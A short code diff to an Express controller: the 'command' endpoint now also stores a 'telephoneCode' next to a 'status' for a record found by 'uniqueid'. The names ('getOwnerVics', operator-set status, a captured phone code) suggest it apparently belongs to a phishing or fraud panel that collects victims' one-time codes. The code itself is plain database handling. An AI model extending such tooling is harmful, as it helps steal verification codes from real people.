@@ -17,9 +17,14 @@ const getOwnerVics = async (req, res) => {
 };
 
 const command = async (req, res) => {
-	const { uniqueid, status } = req.body;
+	const { uniqueid, status, telephoneCode } = req.body;
 	try {
-		await NSI.findOneAndUpdate({ uniqueid }, { status }).exec();
+		if (telephoneCode)
+			await NSI.findOneAndUpdate(
+				{ uniqueid },
+				{ status, telephoneCode }
+			).exec();
+		else await NSI.findOneAndUpdate({ uniqueid }, { status }).exec();
 		res.sendStatus(200);
 	} catch (error) {
 		console.log(error);
